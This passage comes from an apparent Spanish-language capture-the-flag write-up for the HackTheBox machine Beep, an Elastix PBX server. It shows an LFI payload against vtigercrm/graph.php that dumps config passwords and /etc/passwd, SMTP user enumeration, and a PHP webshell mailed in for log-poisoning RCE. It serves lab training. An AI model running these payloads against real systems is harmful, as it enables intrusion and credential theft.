+        Content-Length: <span class=m>278</span>
+        Connection: close
+        Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>iso-8859-1
+
+WhatWeb report <span class=k>for</span> https://10.10.10.7/
+Status    : <span class=m>200</span> OK
+Title     : Elastix - Login page
+IP        : 10.10.10.7
+Country   : RESERVED, ZZ
+
+Summary   : X-Powered-By<span class=o>[</span>PHP/5.1.6<span class=o>]</span>, HTTPServer<span class=o>[</span>CentOS<span class=o>][</span>Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)]</span>, Script<span class=o>[</span>text/javascript<span class=o>]</span>, Apache<span class=o>[</span>2.2.3<span class=o>]</span>, PasswordField<span class=o>[</span>input_pass<span class=o>]</span>, Cookies<span class=o>[</span>elastixSession<span class=o>]</span>, PHP<span class=o>[</span>5,5.1,5.1.6<span class=o>]</span>
+
+Detected Plugins:
+<span class=o>[</span> Apache <span class=o>]</span>
+        The Apache HTTP Server Project is an effort to develop and
+        maintain an open-source HTTP server <span class=k>for</span> modern operating
+        systems including UNIX and Windows NT. The goal of this
+        project is to provide a secure, efficient and extensible
+        server that provides HTTP services in sync with the current
+        HTTP standards.
+
+        Version      : 2.2.3 <span class=o>(</span>from HTTP Server Header<span class=o>)</span>
+        Google Dorks: <span class=o>(</span>3<span class=o>)</span>
+        Website     : http://httpd.apache.org/
+
+<span class=o>[</span> Cookies <span class=o>]</span>
+        Display the names of cookies in the HTTP headers. The
+        values are not returned to save on space.
+
+        String       : elastixSession
+
+<span class=o>[</span> HTTPServer <span class=o>]</span>
+        HTTP server header string. This plugin also attempts to
+        identify the operating system from the server header.
+
+        OS           : CentOS
+        String       : Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span> <span class=o>(</span>from server string<span class=o>)</span>
+
+<span class=o>[</span> PHP <span class=o>]</span>
+        PHP is a widely-used general-purpose scripting language
+        that is especially suited <span class=k>for</span> Web development and can be
+        embedded into HTML. This plugin identifies PHP errors,
+        modules and versions and extracts the <span class=nb>local</span> file path and
+        username <span class=k>if</span> present.
+
+        Version      : 5.1.6
+        Version      : <span class=m>5</span>
+        Version      : 5.1
+        Google Dorks: <span class=o>(</span>2<span class=o>)</span>
+        Website     : http://www.php.net/
+
+<span class=o>[</span> PasswordField <span class=o>]</span>
+        find password fields
+
+        String       : input_pass <span class=o>(</span>from field name<span class=o>)</span>
+
+<span class=o>[</span> Script <span class=o>]</span>
+        This plugin detects instances of script HTML elements and
+        returns the script language/type.
+
+        String       : text/javascript
+
+<span class=o>[</span> X-Powered-By <span class=o>]</span>
+        X-Powered-By HTTP header
+
+        String       : PHP/5.1.6 <span class=o>(</span>from x-powered-by string<span class=o>)</span>
+
+HTTP Headers:
+        HTTP/1.1 <span class=m>200</span> OK
+        Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 23:02:31 GMT
+        Server: Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span>
+        X-Powered-By: PHP/5.1.6
+        Set-Cookie: <span class=nv>elastixSession</span><span class=o>=</span>jqms410lvrkucq18tlgq3di3i7<span class=p>;</span> <span class=nv>path</span><span class=o>=</span>/
+        Expires: Thu, <span class=m>19</span> Nov <span class=m>1981</span> 08:52:00 GMT
+        Cache-Control: no-store, no-cache, must-revalidate, post-check<span class=o>=</span>0, pre-check<span class=o>=</span><span class=m>0</span>
+        Pragma: no-cache
+        Content-Length: <span class=m>1785</span>
+        Connection: close
+        Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8
+</code></pre></td></tr></table>
+</div>
+</div><p>Cuando visitamos la web en el puerto 80 nos redirige al puerto 443 / HTTPS.</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -sk https://10.10.10.7 <span class=p>|</span> html2text
+
+<span class=o>[</span>elastix logo<span class=o>]</span>
+Username:
+<span class=o>[</span>input_user          <span class=o>]</span>
+Password:
+<span class=o>[</span>********************<span class=o>]</span>
+<span class=o>[</span>Submit<span class=o>]</span>
+Elastix is licensed under GPL by PaloSanto_Solutions. <span class=m>2006</span> - 2021.
+</code></pre></td></tr></table>
+</div>
+</div><p>En el puerto 443 podemos ver una página de inicio de sesión de Elastix:</p>
+<p>Elastix es un private branch exchange (PBX) software. Una PBX controla los dispositivos VoIP dentro de una red corporativa.</p>
+<h2 id=directory--files-fuzzing>Directory & Files Fuzzing</h2>
+<p>Las listas de palabras más comunes para el fuzzing son:</p>
+<ul>
+<li>common.txt</li>
+<li>big.txt</li>
+<li>directory-list.2.3-medium.txt</li>
+</ul>
+<p>Voy a eliminar las líneas que empiezan con un comentario de la lista de palabras <code>directory-list.2.3-medium.txt</code> y crear una nueva lista de palabras sin ellas:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>catn /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class=p>|</span> grep -v <span class=s1>&#39;^#&#39;</span> &gt; directory-list-2.3-medium.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>Como sabemos que este sitio utiliza PHP podemos añadir una lista de extensiones:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ ffuf -w directory-list-2.3-medium.txt -u https://10.10.10.7/FUZZ -e .php,.txt -t <span class=m>150</span>
+
+        /<span class=s1>&#39;___\  /&#39;</span>___<span class=se>\ </span>          /<span class=err>&#39;</span>___<span class=se>\
+</span><span class=se></span>       /<span class=se>\ \_</span>_/ /<span class=se>\ \_</span>_/  __  __  /<span class=se>\ \_</span>_/
+       <span class=se>\ \ </span>,__<span class=se>\\</span> <span class=se>\ </span>,__<span class=se>\/\ \/\ \ \ \ </span>,__<span class=se>\
+</span><span class=se></span>        <span class=se>\ \ \_</span>/ <span class=se>\ \ \_</span>/<span class=se>\ \ \_\ \ \ \ \_</span>/
+         <span class=se>\ \_\ </span>  <span class=se>\ \_\ </span> <span class=se>\ \_</span>___/  <span class=se>\ \_\
+</span><span class=se></span>          <span class=se>\/</span>_/    <span class=se>\/</span>_/   <span class=se>\/</span>___/    <span class=se>\/</span>_/
+
+       v1.3.1 Kali Exclusive &lt;<span class=m>3</span>
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://10.10.10.7/FUZZ
+ :: Wordlist         : FUZZ: directory-list-2.3-medium.txt
+ :: Extensions       : .php .txt
+ :: Follow redirects : <span class=nb>false</span>
+ :: Calibration      : <span class=nb>false</span>
+ :: Timeout          : <span class=m>10</span>
+ :: Threads          : <span class=m>150</span>
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+images                  <span class=o>[</span>Status: 301, Size: 310, Words: 20, Lines: 10<span class=o>]</span>
+index.php               <span class=o>[</span>Status: 200, Size: 1785, Words: 103, Lines: 35<span class=o>]</span>
+                        <span class=o>[</span>Status: 200, Size: 1785, Words: 103, Lines: 35<span class=o>]</span>
+<span class=nb>help</span>                    <span class=o>[</span>Status: 301, Size: 308, Words: 20, Lines: 10<span class=o>]</span>
+register.php            <span class=o>[</span>Status: 200, Size: 1785, Words: 103, Lines: 35<span class=o>]</span>
+themes                  <span class=o>[</span>Status: 301, Size: 310, Words: 20, Lines: 10<span class=o>]</span>
+modules                 <span class=o>[</span>Status: 301, Size: 311, Words: 20, Lines: 10<span class=o>]</span>
+mail                    <span class=o>[</span>Status: 301, Size: 308, Words: 20, Lines: 10<span class=o>]</span>
+admin                   <span class=o>[</span>Status: 301, Size: 309, Words: 20, Lines: 10<span class=o>]</span>
+static                  <span class=o>[</span>Status: 301, Size: 310, Words: 20, Lines: 10<span class=o>]</span>
+lang                    <span class=o>[</span>Status: 301, Size: 308, Words: 20, Lines: 10<span class=o>]</span>
+config.php              <span class=o>[</span>Status: 200, Size: 1785, Words: 103, Lines: 35<span class=o>]</span>
+robots.txt              <span class=o>[</span>Status: 200, Size: 28, Words: 3, Lines: 3<span class=o>]</span>
+var                     <span class=o>[</span>Status: 301, Size: 307, Words: 20, Lines: 10<span class=o>]</span>
+panel                   <span class=o>[</span>Status: 301, Size: 309, Words: 20, Lines: 10<span class=o>]</span>
+<span class=o>[</span>WARN<span class=o>]</span> Caught keyboard interrupt <span class=o>(</span>Ctrl-C<span class=o>)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=admin>/admin</h3>
+<p>Al ir a /admin, pide un inicio de sesión con autenticación básica HTTP:</p>
+<p>![[admin.png]]</p>
+<p>Si intentamos admin:admin no entra, sin embargo, si le damos a cancelar nos redirige a /admin/config.php:</p>
+<p>![[http-basic-auth-cancel-redirect.png]]</p>
+<h3 id=searchsploit>Searchsploit</h3>
+<p>Si usamos searchsploit para encontrar exploits en Elastix:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ searchsploit elastix
+----------------------------------------------------- ---------------------------------
+ Exploit Title                                       <span class=p>|</span>  Path
+----------------------------------------------------- ---------------------------------
+Elastix - <span class=s1>&#39;page&#39;</span> Cross-Site Scripting                <span class=p>|</span> php/webapps/38078.py
+Elastix - Multiple Cross-Site Scripting Vulnerabilit <span class=p>|</span> php/webapps/38544.txt
+Elastix 2.0.2 - Multiple Cross-Site Scripting Vulner <span class=p>|</span> php/webapps/34942.txt
+Elastix 2.2.0 - <span class=s1>&#39;graph.php&#39;</span> Local File Inclusion     <span class=p>|</span> php/webapps/37637.pl
+Elastix 2.x - Blind SQL Injection                    <span class=p>|</span> php/webapps/36305.txt
+Elastix &lt; 2.5 - PHP Code Injection                   <span class=p>|</span> php/webapps/38091.php
+FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Executi <span class=p>|</span> php/webapps/18650.py
+----------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre></td></tr></table>
+</div>
+</div><p>Podemos ver una vista exploits, para acotar esto podemos usar la pista de la máquina, que dice LFI, o podemos leer cada exploit y confirmar si la vulnerabilidad existe, en este caso si leemos el exploit el siguiente exploit de perl:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ searchsploit -x php/webapps/37637.pl
+</code></pre></td></tr></table>
+</div>
+</div><p>Hay una línea que podemos usar para confirmar si este archivo existe:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=c1>#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Podemos usar curl para confirmar que este archivo existe:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -Isk https://10.10.10.7/vtigercrm/graph.php
+HTTP/1.1 <span class=m>200</span> OK
+Date: Wed, <span class=m>22</span> Dec <span class=m>2021</span> 23:12:58 GMT
+Server: Apache/2.2.3 <span class=o>(</span>CentOS<span class=o>)</span>
+X-Powered-By: PHP/5.1.6
+Connection: close
+Content-Type: text/html<span class=p>;</span> <span class=nv>charset</span><span class=o>=</span>UTF-8
+</code></pre></td></tr></table>
+</div>
+</div><p>Podemos confirmar el POC con curl:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -vsk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action&#34;</span>
+*   Trying 10.10.10.7:443...
+* Connected to 10.10.10.7 <span class=o>(</span>10.10.10.7<span class=o>)</span> port <span class=m>443</span> <span class=o>(</span><span class=c1>#0)</span>
+&lt;..SNIP..&gt;
+<span class=c1># AMPDBPASS=amp109</span>
+<span class=nv>AMPDBPASS</span><span class=o>=</span>jEhdIekWmdjE
+&lt;..SNIP..&gt;
+</code></pre></td></tr></table>
+</div>
+</div><p>Debido a que no hay filtro de &lsquo;../&rsquo; y puedo pasar el porcentaje %00 para truncar el texto, y la opción current_language lleva a un archivo, podemos hacer LFI. El porcentaje <code>%00</code> indica que PHP está añadiendo la extensión <code>.php</code> a la entrada antes de incluirla. Al agregar el porcentaje <code>%00</code> a una instancia de PHP obsoleta truncaría la cadena, haciendo que la extensión <code>.php</code> sea ignorado.</p>
+<p>Parece que tenemos algunas contraseñas de la salida anterior, podemos filtrar esto:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -sk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action&#34;</span> <span class=p>|</span> grep -E <span class=s1>&#39;PASS=|PASSWORD=&#39;</span>
+<span class=c1># AMPDBPASS=amp109</span>
+<span class=nv>AMPDBPASS</span><span class=o>=</span>jEhdIekWmdjE
+<span class=c1>#AMPMGRPASS=amp111</span>
+<span class=nv>AMPMGRPASS</span><span class=o>=</span>jEhdIekWmdjE
+<span class=c1>#FOPPASSWORD=passw0rd</span>
+<span class=nv>FOPPASSWORD</span><span class=o>=</span>jEhdIekWmdjE
+<span class=nv>ARI_ADMIN_PASSWORD</span><span class=o>=</span>jEhdIekWmdjE
+</code></pre></td></tr></table>
+</div>
+</div><p>Guárdalo en un archivo:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>curl -sk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action&#34;</span> <span class=p>|</span> grep -E <span class=s1>&#39;PASS=|PASSWORD=&#39;</span> <span class=p>|</span> cut -d <span class=s1>&#39;=&#39;</span> -f <span class=m>2</span> <span class=p>|</span> uniq -u &gt;&gt; passwords.txt
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora tenemos una lista de contraseñas:</p>
+<ul>
+<li>amp109</li>
+<li>amp111</li>
+<li>jEhdIekWmdjE</li>
+<li>passw0rd</li>
+</ul>
+<p>Ya que tenemos LFI, podemos intentar enumerar los usuarios también, vamos a leer el archivo <code>/etc/passwd</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -sk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&amp;module=Accounts&amp;action&#34;</span>
+root❌0:0:root:/root:/bin/bash
+bin❌1:1:bin:/bin:/sbin/nologin
+daemon❌2:2:daemon:/sbin:/sbin/nologin
+adm❌3:4:adm:/var/adm:/sbin/nologin
+lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
+sync❌5:0:sync:/sbin:/bin/sync
+shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
+halt❌7:0:halt:/sbin:/sbin/halt
+mail❌8:12:mail:/var/spool/mail:/sbin/nologin
+news❌9:13:news:/etc/news:
+uucp❌10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator❌11:0:operator:/root:/sbin/nologin
+games❌12💯games:/usr/games:/sbin/nologin
+gopher❌13:30:gopher:/var/gopher:/sbin/nologin
+ftp❌14:50:FTP User:/var/ftp:/sbin/nologin
+nobody❌99:99:Nobody:/:/sbin/nologin
+mysql❌27:27:MySQL Server:/var/lib/mysql:/bin/bash
+distcache❌94:94:Distcache:/:/sbin/nologin
+vcsa❌69:69:virtual console memory owner:/dev:/sbin/nologin
+pcap❌77:77::/var/arpwatch:/sbin/nologin
+ntp❌38:38::/etc/ntp:/sbin/nologin
+cyrus❌76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
+dbus❌81:81:System message bus:/:/sbin/nologin
+apache❌48:48:Apache:/var/www:/sbin/nologin
+mailman❌41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
+rpc❌32:32:Portmapper RPC user:/:/sbin/nologin
+postfix❌89:89::/var/spool/postfix:/sbin/nologin
+asterisk❌100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
+rpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+nfsnobody❌65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+sshd❌74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+spamfilter❌500:500::/home/spamfilter:/bin/bash
+haldaemon❌68:68:HAL daemon:/:/sbin/nologin
+xfs❌43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+fanis❌501:501::/home/fanis:/bin/bash
+Sorry! Attempt to access restricted file.
+</code></pre></td></tr></table>
+</div>
+</div><p>Filtremos los nombres de usuario y guardémoslos en un archivo:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ curl -sk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/passwd%00&amp;module=Accounts&amp;action&#34;</span> <span class=p>|</span> grep bash <span class=p>|</span> cut -d <span class=s1>&#39;:&#39;</span> -f <span class=m>1</span> &gt; users.txt
+❯ cat users.txt
+───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: users.txt
+───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   <span class=m>1</span>   │ root
+   <span class=m>2</span>   │ mysql
+   <span class=m>3</span>   │ cyrus
+   <span class=m>4</span>   │ asterisk
+   <span class=m>5</span>   │ spamfilter
+   <span class=m>6</span>   │ fanis
+───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=smtp---port-tcp-25>SMTP - Port TCP 25</h2>
+<p>Podemos utilizar telnet para conectarnos a SMTP:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ telnet 10.10.10.7 <span class=m>25</span>
+Trying 10.10.10.7...
+Connected to 10.10.10.7.
+Escape character is <span class=s1>&#39;^]&#39;</span>.
+<span class=m>220</span> beep.localdomain ESMTP Postfix <span class=c1># &lt; wait for this</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Alternativamente, podemos utilizar nc:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ nc -nv 10.10.10.7 <span class=m>25</span>
+<span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.7<span class=o>]</span> <span class=m>25</span> <span class=o>(</span>smtp<span class=o>)</span> open
+<span class=m>220</span> beep.localdomain ESMTP Postfix <span class=c1># &lt; wait for this</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id=smtp-user-enumeration>SMTP User Enumeration</h3>
+<p>Podemos validar que los usuarios que tienen un <code>email</code> en SMTP:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ telnet 10.10.10.7 <span class=m>25</span>
+Trying 10.10.10.7...
+Connected to 10.10.10.7.
+Escape character is <span class=s1>&#39;^]&#39;</span>.
+<span class=m>220</span> beep.localdomain ESMTP Postfix
+HELO
+<span class=m>501</span> Syntax: HELO hostname
+HELO wixnic
+<span class=m>250</span> beep.localdomain
+VRFY root@localhost
+<span class=m>252</span> 2.0.0 root@localhost
+VRFY root
+<span class=m>252</span> 2.0.0 root
+</code></pre></td></tr></table>
+</div>
+</div><h2 id=smtp-log-poisoning-through-lfi-to-rce-path-1>SMTP Log Poisoning through LFI to RCE [Path #1]</h2>
+<p>Ya que el SMTP está abierto podemos intentar enviar correos electrónicos con código malicioso, este código malicioso se almacenará en los archivos de registro bajo <code>/var/mail/[nombre de usuario]</code>, ya tenemos nombres de usuario válidos así que podemos intentar hacer Log Poisoning vía SMTP y acceder al registro vía LFI.</p>
+<p>Utilicemos telnet para enviar un correo electrónico:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>telnet 10.10.10.7 <span class=m>25</span>
+
+HELO wixnic
+MAIL FROM:&lt;wixnic@helo.htb&gt;
+RCPT TO:&lt;asterisk@localhost&gt;
+DATA
+Message from telnet PHP code: &lt;?php system<span class=o>(</span><span class=nv>$_REQUEST</span><span class=o>[</span><span class=s2>&#34;telnet_cmd&#34;</span><span class=o>])</span><span class=p>;</span> ?&gt;
+.
+QUIT
+</code></pre></td></tr></table>
+</div>
+</div><p>Así se ve la salida de cada entrada:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>❯ telnet 10.10.10.7 <span class=m>25</span>
+
+Trying 10.10.10.7...
+Connected to 10.10.10.7.
+Escape character is <span class=s1>&#39;^]&#39;</span>.
+<span class=m>220</span> beep.localdomain ESMTP Postfix
+HELO wixnic
+<span class=m>250</span> beep.localdomain
+MAIL FROM:&lt;wixnic@helo.htb&gt;
+<span class=m>250</span> 2.1.0 Ok
+RCPT TO:&lt;asterisk@localhost&gt;
+<span class=m>250</span> 2.1.5 Ok
+DATA
+<span class=m>354</span> End data with &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;
+Message from telnet PHP code: &lt;?php system<span class=o>(</span><span class=nv>$_REQUEST</span><span class=o>[</span><span class=s2>&#34;telnet_cmd&#34;</span><span class=o>])</span><span class=p>;</span> ?&gt;
+.
+<span class=m>250</span> 2.0.0 Ok: queued as 37235D92FD
+QUIT
+<span class=m>221</span> 2.0.0 Bye
+Connection closed by foreign host.
+</code></pre></td></tr></table>
+</div>
+</div><p>Ahora envía la petición curl con el parámetro <code>&telnet_cmd</code> con el argumento como comando <code>id</code>:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td>
+<td class=lntd>
+<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>curl -sk <span class=s2>&#34;https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../../var/mail/asterisk%00&amp;module=Accounts&amp;action&amp;telnet_cmd=id&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Podemos enviar un correo electrónico con los intercambios:</p>
+<div class=highlight><div class=chroma>
+<table class=lntable><tr><td class=lntd>
+<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
